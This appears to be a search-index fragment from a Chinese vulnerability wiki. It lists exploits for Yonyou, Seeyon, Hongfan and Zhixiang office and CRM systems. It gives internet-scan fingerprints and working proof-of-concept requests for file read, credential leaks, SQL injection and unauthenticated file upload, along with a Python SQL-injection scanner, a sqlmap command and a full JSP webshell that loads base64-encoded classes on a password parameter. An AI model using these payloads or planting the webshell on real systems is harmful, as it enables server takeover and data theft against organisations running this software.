","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 U8 CRM客户关系管理系统 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 web.body=\"用友U8CRM\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /ajax/getemaildata.php?DontCheckLogin=1\u0026filePath=c:/windows/win.ini ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-crm%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-getemaildata.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 U8 OA ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"用友U8-OA\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /yyoa/ext/https/getSessionList.jsp?cmd=getAll ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-getsessionlist.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 U8 OA test.jsp SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 U8 OA ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"用友U8-OA\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 可参考 文章 [致远OA A6 test.jsp SQL注入漏洞](http://wiki.peiqi.tech/PeiQi_Wiki/OA 产品漏洞/致远OA/致远OA A6 test.jsp SQL注入漏洞.html) 登录页面如下 POC /yyoa/common/js/menu/test.jsp?doType=101\u0026S1=(SELECT%20MD5(1)) 利用方法与致远OA 的SQL注入类似 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 用友 U8 OA test.jsp SQL注入漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile \u003e\u003e\u003e ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101\u0026S1=(SELECT%20md5(1))\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"c4ca4238a0b923820dcc509a6f75849b\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 \\n[o] 响应地址: {} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-u8-oa-test.jsp-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 移动管理系统 uploadApk.do 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 移动管理系统 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"用友-移动系统管理\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 Content-Disposition: form-data; name=\"downloadpath\"; filename=\"a.jsp\" Content-Type: application/msword hello ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3-- /maupload/apk/a.jsp ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadapk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友时空 KSOA V9.0 文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友时空 KSOA 是用友网络科技股份有限公司建立在 SOA 理念指导下研发的新一代产品，其中 com.sksoft.bill.ImageUpload 存在前台文件上传漏洞，攻击者可以在不登陆的情况下上传恶意 Webshell，控制系统权限。 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"用友-时空KSOA\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录界面： 漏洞 URL： /servlet/com.sksoft.bill.ImageUpload?filepath=/\u0026filename= 发送数据包： POST /servlet/com.sksoft.bill.ImageUpload?filepath=/\u0026filename=1.jsp HTTP/1.1 Host: your-ip Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: https://en.fofa.info/ Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Cookie: JSESSIONID=825A011F31259CCA1649D5DF4849635E Connection: close Content-Length: 1 \u003c%! your-payload %\u003e 访问 /pictures/1.jsp 即可。 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Webshell 密码：passwd \u003c%! class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } %\u003e \u003c% String cls = request.getParameter(\"passwd\"); if (cls != null) { new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext); } %\u003e ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:1","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-ksoa-v9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"红帆OA ioFileExport.aspx 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 红帆OA ioFileExport.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感信息 ","date":"0001-01-01","objectID":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 红帆OA ","date":"0001-01-01","objectID":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"红帆-ioffice\" ","date":"0001-01-01","objectID":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC, 读取web.config文件 /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config\u0026filename=test.txt\u0026ContentType=application/octet-stream /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx\u0026filename=test.txt\u0026ContentType=application/octet-stream ","date":"0001-01-01","objectID":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BA%A2%E5%B8%86oa-iofileexport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致翔OA msglog.aspx SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致翔OA msglog.aspx文件存在SQL注入漏洞，攻击者通过漏洞可获取敏感信息 ","date":"0001-01-01","objectID":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致翔OA ","date":"0001-01-01","objectID":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"致翔软件-致翔OA\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 存在漏洞的文件为 msglog.aspx,涉及注入的参数为 user /mainpage/msglog.aspx?user=1 SQLMap跑一下 sqlmap -u http://127.0.0.1/mainpage/msglog.aspx?user=1 -p user --batch ","date":"0001-01-01","objectID":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E7%BF%94oa-msglog.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA A6 config.jsp 敏感信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 致远OA A6 config.jsp页面可未授权访问，导致敏感信息泄漏漏洞，攻击者通过漏洞可以获取服务器中的敏感信息 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 致远OA A6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"yyoa\" \u0026\u0026 app=\"致远互联-OA\" ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /yyoa/ext/trafaxserver/SystemManage/config.jsp ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-config.jsp-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"致远OA A6 createMysql.jsp 数据库敏感信息泄露 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:0:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞描述 致远OA A6 存在数据库敏感信息泄露，攻击者可以通过访问特定的URL获取数据库账户以及密码 MD5 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:1:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"漏洞影响 致远OA A6 ","date":"0001-01-01","objectID":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:2:0","tags":null,"title":"","uri":"/%E8%87%B4%E8%BF%9Coa-a6-createmysql.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"网络测绘 title=\"致远A8+协同管理软件.A6\" 